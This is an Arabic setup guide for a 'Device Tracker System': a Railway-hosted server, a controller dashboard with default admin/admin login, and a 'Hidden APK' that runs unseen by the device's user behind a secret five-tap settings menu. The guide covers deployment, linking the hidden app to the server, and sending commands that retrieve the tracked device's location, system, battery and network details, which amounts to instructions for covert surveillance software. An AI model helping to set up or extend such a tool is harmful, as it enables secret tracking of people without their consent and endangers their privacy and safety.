# 📱 دليل الإعداد الكامل - Device Tracker System

## 🎯 نظرة عامة على النظام

النظام يتكون من ثلاثة مكونات رئيسية:

| المكون | الوصف | الحالة |
|:---:|:---:|:---:|
| **Controller App** | لوحة تحكم احترافية مرئية | واجهة كاملة وواضحة |
| **Hidden APK** | تطبيق مخفي يعمل في الخلفية | مخفي تماماً للمستخدم |
| **Server** | الخادم المركزي | يعمل على منصة سحابية دائمة |

---

## 🚀 الخطوة 1: إعداد الخادم الدائم (Railway)

### أ) إنشاء حساب على Railway

1. اذهب إلى [railway.app](https://railway.app)
2. سجل دخول باستخدام حساب GitHub الخاص بك
3. وافق على الأذونات المطلوبة

### ب) نشر الخادم

1. اختر **"New Project"** من لوحة التحكم
2. اختر **"Deploy from GitHub repo"**
3. ابحث عن مستودع `device-tracker-system`
4. اختر الفرع `master`
5. في إعدادات الخدمة:
   - تأكد من تعيين `Root Directory` إلى `/server`
   - سيتم اكتشاف `Dockerfile` تلقائياً

### ج) الحصول على رابط الخادم

بعد انتهاء البناء (Build)، ستجد رابطاً مثل:
```
https://device-tracker-xxxxx.up.railway.app
```

**احفظ هذا الرابط - ستحتاجه لاحقاً!**

---

## 📱 الخطوة 2: إعداد لوحة التحكم (Controller App)

### أ) فتح لوحة التحكم

1. افتح ملف `controller-app/index.html` في المتصفح
2. ستظهر شاشة تسجيل دخول احترافية
3. استخدم بيانات التسجيل الافتراضية:
   - **اسم المستخدم:** admin
   - **كلمة المرور:** admin

### ب) ضبط رابط الخادم

1. بعد تسجيل الدخول، اذهب إلى قسم **"الإعدادات"**
2. أدخل رابط الخادم الذي حصلت عليه من Railway:
   ```
   https://device-tracker-xxxxx.up.railway.app
   ```
3. اضغط **"حفظ الإعدادات"**

### ج) استخدام لوحة التحكم

**الأقسام الرئيسية:**

- **الأجهزة:** عرض جميع الأجهزة المتصلة وحالتها
- **الأوامر:** إرسال أوامر مخصصة للأجهزة
- **الإعدادات:** ضبط رابط الخادم والخيارات الأخرى

---

## 🔐 الخطوة 3: إعداد التطبيق المخفي (Hidden APK)

### أ) فتح التطبيق المخفي

1. افتح ملف `hidden-apk/index.html` في المتصفح
2. ستظهر شاشة سوداء (هذا طبيعي - التطبيق يعمل في الخلفية)

### ب) الوصول إلى إعدادات التطبيق المخفي

**طريقة الوصول السرية:**

1. انقر **5 مرات متتالية** في الزاوية السفلى اليمنى من الشاشة
2. ستظهر نافذة إعدادات سوداء

### ج) ضبط رابط الخادم

في نافذة الإعدادات:

1. أدخل رابط الخادم:
   ```
   https://device-tracker-xxxxx.up.railway.app
   ```
2. اضغط **"SAVE & RESTART"**
3. التطبيق سيعيد تشغيل نفسه تلقائياً

---

## ✅ اختبار النظام

### التحقق من الاتصال

1. **في لوحة التحكم:**
   - اذهب إلى قسم "الأجهزة"
   - اضغط "تحديث"
   - يجب أن ترى جهازك المخفي في القائمة

2. **في الخادم:**
   - افتح رابط الخادم مباشرة في المتصفح
   - يجب أن تظهر رسالة تأكيد أن الخادم يعمل

### إرسال أمر اختبار

1. من لوحة التحكم، اذهب إلى قسم "الأوامر"
2. أدخل أمر بسيط:
   ```json
   {"type": "get_system_info"}
   ```
3. اضغط "إرسال"
4. يجب أن تحصل على استجابة من الجهاز المخفي

---

## 🔧 استكشاف الأخطاء

| المشكلة | الحل |
|:---:|:---:|
| **لا تظهر الأجهزة** | تأكد من رابط الخادم والاتصال بالإنترنت |
| **الخادم لا يستجيب** | تحقق من حالة الخادم على Railway |
| **التطبيق المخفي لا يرسل بيانات** | تأكد من رابط الخادم في الإعدادات السرية |
| **خطأ CORS** | تأكد من أن الخادم يدعم CORS (تم تفعيله بالفعل) |

---

## 📊 الأوامر المتاحة

```json
// الحصول على معلومات النظام
{"type": "get_system_info"}

// الحصول على الموقع الجغرافي
{"type": "get_location"}

// الحصول على معلومات البطارية
{"type": "get_battery"}

// الحصول على معلومات الشبكة
{"type": "get_network"}
```

---

## 🔒 ملاحظات الأمان

1. **غيّر كلمة المرور الافتراضية** عند استخدام النظام في الإنتاج
2. **استخدم HTTPS دائماً** - Railway يوفر شهادة SSL تلقائياً
3. **لا تشارك رابط الخادم** مع أشخاص غير موثوقين
4. **راقب السجلات** بانتظام للكشف عن أي نشاط غير عادي

---

## 📞 الدعم والمساعدة

للمزيد من المعلومات:
- اطلع على ملف `README.md`
- اطلع على ملف `README_SERVER.md`
- تحقق من ملفات API في `API_DOCUMENTATION.md`

---

**تم آخر تحديث:** مارس 2026
